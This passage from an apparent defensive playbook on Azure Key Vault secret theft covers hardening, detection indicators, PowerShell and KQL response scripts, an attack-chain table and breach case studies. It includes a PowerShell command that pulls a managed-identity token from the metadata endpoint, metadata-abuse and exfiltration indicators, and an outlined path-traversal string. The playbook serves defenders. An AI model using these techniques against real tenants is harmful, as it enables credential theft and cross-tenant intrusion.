- ✅ Forces attacker to update access as passwords change
- ✅ Creates forensic evidence of rotation timing
- ⚠️ Requires coordination with dependent systems (downtime if not automated)

**References:**
- [Azure Key Vault Secret Rotation](https://learn.microsoft.com/en-us/azure/key-vault/secrets/tutorial-rotation)

---

#### 2.2 Use Managed Identities (Eliminate Hardcoded Secrets)

**Objective**: Replace hardcoded secrets in application code with managed identities (automatic authentication).

**Applies To**: Azure-hosted applications (VMs, Functions, App Services, Kubernetes)

**Impact**: Reduces secrets in Key Vault and removes credential files in source code / CI/CD logs

**Manual Steps (Assign Managed Identity to Azure VM):**
1. Navigate to **Virtual Machines** → Select VM
2. Left menu → **Identity**
3. **Status**: ON
4. Click **Save**
5. Navigate to **Key Vault** → **Access Control (IAM)**
6. Click **+ Add role assignment**
7. Role: **Key Vault Secrets User**
8. Assign to: **Managed Identity** → Select the VM
9. **Save**

**Application Code (Use Managed Identity):**
```csharp
// Instead of: var secret = config["ConnectionString"]
// Use managed identity:

using Azure.Identity;
using Azure.Security.KeyVault.Secrets;

var client = new SecretClient(
    new Uri("https://prod-keyvault-001.vault.azure.net/"),
    new DefaultAzureCredential()  // Automatically uses VM's managed identity
);

KeyVaultSecret secret = await client.GetSecretAsync("app-db-password");
string connectionString = secret.Value;
```

**Validation (Test Managed Identity Access):**
```powershell
# From within Azure VM/Function:
$MetadataUri = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://vault.azure.net"
$Token = (Invoke-WebRequest -Uri $MetadataUri -Headers @{Metadata="true"} -UseBasicParsing).Content | ConvertFrom-Json
Write-Host "[+] Managed Identity token obtained: $($Token.access_token.Substring(0, 50))..."
```

**References:**
- [Azure Managed Identities](https://learn.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/)

---

#### 2.3 Enable Soft Delete and Purge Protection

**Objective**: Prevent accidental (or malicious) permanent deletion of secrets; maintain recovery capability.

**Applies To**: All Key Vaults containing critical secrets

**Manual Steps (Azure Portal):**
1. Navigate to **Key Vault** → **Properties**
2. Enable:
   - ✅ **Soft delete**: ON (90-day recovery window)
   - ✅ **Purge protection**: ON (must wait 90 days before permanent delete)
3. **Save**

**Manual Steps (PowerShell):**
```powershell
# Enable soft delete and purge protection
Update-AzKeyVault -VaultName "prod-keyvault-001" `
    -ResourceGroupName "production-rg" `
    -EnableSoftDelete `
    -EnablePurgeProtection

# Verify
Get-AzKeyVault -VaultName "prod-keyvault-001" | Select-Object EnableSoftDelete, EnablePurgeProtection
```

**Expected Output:**
```
EnableSoftDelete           EnablePurgeProtection
----------------           ---------------------
True                        True
```

**Impact**:
- ✅ Deleted secrets recoverable for 90 days
- ✅ Prevents permanent deletion for cleanup after breach
- ✅ Maintained audit trail even if attacker deletes secret
- ⚠️ Increases compliance scope (soft-deleted secrets still covered by regulations)

---

## 11. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

#### Azure Activity Log Patterns
- **Operation**: "GetSecret" or "ListSecrets" from unusual IP (non-corporate)
- **Timing**: After-hours or weekend access (business operations typically M-F)
- **Frequency**: 10+ secrets accessed in 5 minutes (bulk extraction)
- **Caller**: Service principal created recently (attacker-created)
- **Result**: Mix of Success and Failure (attacker trying multiple secrets)

#### Suspicious Identity Operations
- **Operation**: "Update Key Vault Access Policy"
- **Details**: "Contributor" role adding "Get" permissions to self
- **Timeline**: Shortly followed by "GetSecret" operations

#### Network / Token Indicators
- **Managed Identity Token Abuse**: HTTP requests to 169.254.169.254 (metadata service) from unexpected processes
- **External Exfiltration**: TLS connections from Azure compute to attacker-controlled domains
- **Unusual Service Principal**: New service principal with "Secrets Officer" role created recently

---

### Forensic Artifacts

#### Azure Activity Log
- **Location**: Azure Portal → Subscription → Activity Log (or AzureActivity table in Sentinel)
- **Retention**: 30 days (default), 90 days if sent to Log Analytics Workspace
- **Evidence**:
  - Exact timestamp of secret access
  - User/service principal identity
  - IP address of caller
  - Result code (Success/Failure)

#### Key Vault Diagnostic Logs
- **Location**: Key Vault → Diagnostic settings → Log Analytics Workspace
- **Table**: AzureDiagnostics (ResourceType == "KEYVAULT")
- **Evidence**:
  - Specific secret names accessed
  - Operation names and results
  - Caller details
  - Request/Response properties

#### Audit Trail
- **Access Policy Modifications**: Complete audit of who changed what policy, when
- **Role Assignments**: All RBAC changes logged in Activity Log
- **Secret Versions**: Deleted/rotated secret versions retained for recovery window

---

### Response Procedures

#### Step 1: Isolate the Compromised Vault

**Objective**: Prevent attacker from continuing to access secrets while investigation proceeds.

**Command (Disable Access to Vault):**
```powershell
# Option 1: Remove all RBAC role assignments (except emergency admin)
$VaultName = "prod-keyvault-001"
$ResourceGroupName = "production-rg"

$RoleAssignments = Get-AzRoleAssignment -ResourceGroupName $ResourceGroupName `
    -ResourceName $VaultName `
    -ResourceType "Microsoft.KeyVault/vaults"

foreach ($Assignment in $RoleAssignments) {
    # Keep only emergency admin
    if ($Assignment.DisplayName -notmatch "EmergencyAdmin") {
        Remove-AzRoleAssignment -ObjectId $Assignment.ObjectId `
            -ResourceGroupName $ResourceGroupName `
            -ResourceName $VaultName `
            -ResourceType "Microsoft.KeyVault/vaults" `
            -RoleDefinitionName $Assignment.RoleDefinitionName
        Write-Host "[+] Removed access for: $($Assignment.DisplayName)"
    }
}

# Option 2: Enable network firewall (if accessible via private endpoint only)
Update-AzKeyVault -VaultName $VaultName `
    -ResourceGroupName $ResourceGroupName `
    -EnableFirewall `
    -DefaultAction Deny
```

**Expected Output:**
```
[+] Removed access for: svc_app@contoso.com
[+] Removed access for: dev-team@contoso.com
[+] Vault network access restricted to authorized IPs only
```

**What This Does:**
- ✅ Prevents further secret extraction
- ✅ Preserves vault for forensic analysis
- ⚠️ Causes application outage (requires planned downtime)

---

#### Step 2: Rotate All Secrets

**Objective**: Invalidate stolen secrets by changing them immediately.

**Command (Rotate All Secrets - Bulk Update):**
```powershell
$VaultName = "prod-keyvault-001"
$AllSecrets = Get-AzKeyVaultSecret -VaultName $VaultName

foreach ($Secret in $AllSecrets) {
    # Generate new secret value
    $NewValue = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 32 | % {[char]$_})
    
    # Update in Key Vault
    $SecureValue = ConvertTo-SecureString -String $NewValue -AsPlainText -Force
    Set-AzKeyVaultSecret -VaultName $VaultName -Name $Secret.Name -SecretValue $SecureValue
    
    Write-Host "[+] Rotated secret: $($Secret.Name)"
    
    # TODO: Update dependent systems (database, API, etc.) with new credentials
    Write-Host "[!] MANUAL: Update $($Secret.Name) in dependent system"
}
```

**What This Does:**
- ✅ Invalidates stolen secrets
- ✅ Attacker can no longer authenticate using old credentials
- ⚠️ Requires coordination with dependent systems (causes downtime if not automated)

**Timeline for Rotation:**
- **Immediate**: Non-critical secrets (dev, test environments)
- **Within 1 hour**: API keys, external service credentials
- **Within 4 hours**: Database passwords (schedule during maintenance window)
- **Within 24 hours**: Less-critical credentials

---

#### Step 3: Investigate Access Logs

**Objective**: Determine what secrets were accessed and by whom; scope of compromise.

**Command (Query Access Logs - Sentinel KQL):**
```kusto
// Find all secrets accessed by attacker
AzureActivity
| where OperationName in ("GetSecret", "ListSecrets")
| where ActivityStatus =~ "Success"
| where TimeGenerated between (datetime(2026-01-06 10:00:00Z) .. datetime(2026-01-06 12:00:00Z))
| extend SecretName = extractjson("$.Properties.resource", tostring(Properties))
| summarize AccessCount = count() by Caller, SecretName, CallerIpAddress
| order by AccessCount desc
```

**Expected Output:**
```
Caller: svc_attacker@contoso.com
SecretName: app-db-password, app-api-key-stripe, client-secret-adfs
AccessCount: 15
CallerIpAddress: 203.0.113.50
```

**What This Means:**
- **3 secrets accessed**: Database, external API, authentication service
- **15 accesses in 2 hours**: High-frequency extraction (likely automated script)
- **IP: 203.0.113.50**: External IP (attacker location)

**Business Impact Assessment:**
- **Database**: Customer data accessible (breach notification required)
- **API Key**: Attacker can use API as your application (billing impact, API abuse)
- **Auth Secret**: Attacker can forge tokens/assume service principal identity

---

#### Step 4: Identify Lateral Movement

**Objective**: Determine if attacker used stolen secrets to access other systems.

**Command (Check for Downstream Usage):**
```powershell
# Query logs for suspicious authentication using stolen credentials

# 1. Database access logs
# SELECT * FROM sys.dm_exec_connections WHERE session_id > 50 AND last_read > [time of breach]
# Look for: connections from attacker IP, unusual time of day, high data volume

# 2. API access logs
# Check external API (Stripe, Salesforce, etc.) for unusual requests
# Look for: API calls creating/deleting resources, unusual patterns, from attacker IP

# 3. Cloud service access (Azure, AWS, etc.)
# Check CloudTrail / Activity Log for service principal activity
# Look for: resource creation, permission changes, data exports
```

**Expected Findings (Serious Incident):**
```
[!] Database: 2.5GB data exfiltration to 203.0.113.50 at 2026-01-06 11:30 UTC
[!] API: 50 API requests from attacker IP (create 10 new users, delete 5 others)
[!] Azure: Service principal used to create new storage account, configure firewall rules
```

---

#### Step 5: Disable Compromised Service Principals

**Objective**: Prevent attacker from using stolen credentials to maintain access.

**Command (Disable Service Principal):**
```powershell
# Disable service principal if compromised
$ServicePrincipalId = "a1b2c3d4-e5f6-7890-abcd-ef1234567890"

# Get service principal
$SP = Get-AzADServicePrincipal -ObjectId $ServicePrincipalId

# Disable (set account enabled to false)
Update-AzADServicePrincipal -ObjectId $ServicePrincipalId -AccountEnabled $false

Write-Host "[+] Service principal $($SP.DisplayName) disabled"
Write-Host "[!] Applications using this principal will fail - update config"

# Verify disabled
$SP = Get-AzADServicePrincipal -ObjectId $ServicePrincipalId
Write-Host "Enabled: $($SP.AccountEnabled)"
```

---

## 12. RELATED ATTACK CHAIN

| Step | Phase | Technique | MITRE ID | Description | Enablement |
|---|---|---|---|---|---|
| **1** | **Initial Access** | Phishing / Malware | T1566 / T1190 | Compromise developer machine or CI/CD pipeline | Enables code execution |
| **2** | **Execution** | Cloud CLI / PowerShell | T1059 | Execute Azure commands on compromised system | Enables auth to Azure |
| **3** | **Persistence** | Create Service Principal | T1136 | Create attacker-controlled app identity in Entra ID | Enables future access |
| **4** | **Privilege Escalation (Optional)** | Access Policy Modification | T1552.001 | Escalate to read secrets via policy change | **PREREQUISITE for METHOD 2** |
| **5** | **Credential Access (Current)** | **Key Vault Secret Extraction** | **T1552.001** | **Retrieve secrets from Azure Key Vault** | **Enables authentication to dependent systems** |
| **6** | **Lateral Movement** | Use Stolen Credentials | T1550.001 | Authenticate to database, APIs, cloud services | Attacker now has legitimate access |
| **7** | **Exfiltration** | Cloud Data Staging | T1537 | Download data using stolen credentials | **IMPACT: Data breach** |
| **8** | **Impact** | Data Destruction | T1485 | Use admin credentials to delete backups, disable logging | **FINAL IMPACT: Unrecoverable data loss** |

---

## 13. REAL-WORLD EXAMPLES

### Example 1: Microsoft Storm-0558 Key Breach (June 2023)

- **Target**: Microsoft organization + U.S. Federal agencies + 100+ organizations globally
- **Timeline**: April 2021 - June 2023 (2+ years undetected)
- **Technique Status**: Compromised cryptographic signing key in crash dump; used to forge authentication tokens
- **Attack Method**: 
  1. Microsoft crash dump (internal use only) contained signing key
  2. Key leaked to internet-facing network in April 2021
  3. Attacker obtained key sometime before June 2023
  4. Forged JWT tokens for Outlook Web Access (OWA) access
  5. Tokens appeared legitimate; bypassed all MFA and Conditional Access
  6. Attacker accessed 25 Microsoft executives' mailboxes
  7. Also accessed mailboxes of US Federal agencies (State Department, etc.)
- **Impact**: 
  - **Scope**: Microsoft + 100+ organizations compromised
  - **Detection**: June 2023 (2-year undetected dwell time)
  - **Credentials**: Forged tokens provided complete impersonation
  - **Persistence**: Key valid indefinitely (no expiration)
- **Reference**: [Microsoft Security Blog - Storm-0558](https://www.microsoft.com/en-us/security/blog/2023/07/14/microsoft-shares-additional-information-about-storm-0558-activities/), [CISA Advisory](https://www.cisa.gov/news-events/alerts/2023/07/12/cisa-adds-one-known-exploited-vulnerability-catalog)

---

### Example 2: Azure APIM Cross-Tenant Bypass (Black Hat 2025)

- **Researcher**: Erik Gulbrandsrud (Cloud Security Researcher)
- **Bounty**: $40,000 (Microsoft)
- **Vulnerability**: Path traversal in Azure API Management (APIM) shared infrastructure
- **Attack Method**:
  1. Attacker with low-privilege Entra ID account in Victim Organization A
  2. Uses malicious path in APIM connector request: `../../../../[VictimConnectorType]/[VictimConnectionID]/[action]`
  3. Path traversal bypasses access control checks
  4. Accesses Victim Organization B's Logic App connectors
  5. Extracts secrets from cross-tenant Key Vault via connector authorization
  6. Uses stolen secrets to authenticate to Victim B's systems
- **Impact**: 
  - **Scope**: Any organization with shared APIM
  - **Severity**: Complete cross-tenant isolation bypass
  - **Exploitation**: Simple HTTP request (no special tools)
- **Reference**: [Black Hat 2025 Presentation](https://www.blackhat.com/us-25/), Microsoft Security Update (pending)

---

### Example 3: Lazarus Group - Cloud Credential Targeting

- **Group**: Lazarus (APT, North Korea-linked)
- **Timeline**: 2021-2024
- **Technique**: Compromise on-premises systems, pivot to cloud via stolen service account credentials
- **Attack Method**:
  1. Compromise on-premises server (phishing, RDP exposure)
  2. Enumerate local credential files, browser cache, PowerShell history
  3. Extract Azure service principal credentials from config files
  4. Authenticate to Azure using stolen credentials
  5. Access Key Vault secrets → database credentials → exfiltrate data
  6. Use storage account keys to access backups
- **Impact**:
  - **Duration**: Months-long undetected access
  - **Data**: Customer PII, financial data, source code
  - **Persistence**: Credentials valid for months until rotation
- **Reference**: [Mandiant APT Activity Report](https://mandiant.com/), [CISA APT Guidance](https://www.cisa.gov/apt)

---

### Example 4: GitHub Actions Secrets Exposure in Logs

- **Scope**: GitHub Actions workflows (CI/CD)
- **Vulnerability**: Debug mode logs expose environment variables including secrets
- **Attack Method**:
  1. Attacker opens GitHub repo (public or social engineering access)
  2. Enables "tmate debug session" in workflow
  3. Workflow logs exposed showing: `export AZURE_KEYVAULT_SECRET="..."`
  4. Attacker copies secret value
  5. Uses secret to authenticate to Azure Key Vault
- **Impact**:
  - **Detection**: Public exposure in CI/CD logs
  - **Scope**: Widespread (many orgs use GitHub Actions)
  - **Prevention**: GitHub now masks known secrets in logs, but custom secrets still exposed
- **Reference**: [GitHub Actions Security Best Practices](https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions)

---

## 14. INCIDENT RESPONSE CHECKLIST

### Immediate Actions (0-2 hours)

- [ ] **Confirm breach**: Query Key Vault access logs for suspicious activity
- [ ] **Isolate vault**: Remove all RBAC role assignments (except emergency)
- [ ] **Enable firewall**: Restrict network access to vault (authorized IPs only)
- [ ] **Preserve logs**: Export AzureActivity and AzureDiagnostics logs for forensics
- [ ] **Notify leadership**: CTO, CISO, Legal team
- [ ] **Identify accessed secrets**: Query logs to determine which credentials were stolen

### Short-Term Actions (2-24 hours)

- [ ] **Rotate all secrets** starting with highest-value targets:
  - [ ] Database admin credentials
  - [ ] Service principal client secrets
  - [ ] API keys for external services
  - [ ] Authentication certificates
- [ ] **Update dependent systems**: Re-key databases, APIs, services with new credentials
- [ ] **Disable compromised identities**: Disable service principals used by attacker
- [ ] **Check for lateral movement**: Query downstream systems for unauthorized access
- [ ] **Enable comprehensive logging**: Ensure all Azure services logging to Sentinel
- [ ] **Create detection rules**: Deploy alerts for mass secret access, policy changes

### Medium-Term Actions (1-2 weeks)

- [ ] **Conduct forensic analysis**: Timeline of compromise, scope assessment
- [ ] **Migrate to RBAC**: Convert any remaining Access Policies to RBAC
- [ ] **Implement Managed Identities**: Remove hardcoded secrets from applications
- [ ] **Deploy secrets rotation**: Automated rotation every 90 days
- [ ] **Update network security**: Restrict Key Vault access via Private Endpoints + Firewall
- [ ] **Threat intelligence**: Share IOCs with industry (IP addresses, service principals)
- [ ] **User notifications**: If customer data accessed, notify per GDPR/regulations

### Long-Term Actions (Ongoing)

- [ ] **Monitor**: Continuous monitoring of Key Vault access patterns
- [ ] **Audit RBAC**: Quarterly review of role assignments (least privilege)
- [ ] **Train developers**: Secure credential handling, avoid hardcoding secrets
- [ ] **Implement Compliance**: Ensure controls meet NIST 800-53, ISO 27001, CIS Benchmark
- [ ] **Incident review**: Post-mortem of attack; document lessons learned
- [ ] **Tabletop exercises**: Practice incident response procedures annually

---